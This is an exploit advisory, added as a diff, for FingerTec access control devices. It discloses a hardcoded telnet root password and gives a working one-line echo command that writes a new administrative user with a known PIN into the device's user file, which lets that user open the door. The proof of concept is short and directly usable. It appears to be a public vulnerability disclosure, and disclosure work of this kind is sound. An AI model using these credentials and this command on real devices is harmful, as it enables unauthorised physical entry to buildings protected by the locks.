@@ -1,0 +1,23 @@
+# Exploit Title: Default Root Password and Remote Enrollment on FingerTec Devices 
+# Date: 12-01-2016 
+# Exploit Author: Daniel Lawson 
+# Contact: http://twitter.com/fang0654 
+# Website: https://digital-panther.com 
+# Category: physical access control 
+
+1. Description 
+
+Almost all FingerTec Access Control devices are running with open telnet, with a hardcoded default root password. Additionally, it is trivial to enroll a new administrative user on the device with a pin code or RFID card that will allow opening the door. 
+
+2. Proof of Concept 
+
+Login to telnet with the credentials: root / founder88 
+At the console type in the command: 
+echo -n -e \\\\x39\\\\x5\\\\x6\\\\x31\\\\x32\\\\x33\\\\x34\\\\x35\\\\x48\\\\x61\\\\x78\\\\x78\\\\x30\\\\x72\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x1\\\\x0\\\\x0\\\\x39\\\\x5\\\\x0\\\\x0 >> user.dat 
+This will create a user named Haxx0r with an id of 1337 and a pin of 12345. 
+--- 
+
+Daniel Lawson 
+Digital Panther Security 
+https://digital-panther.com 
+
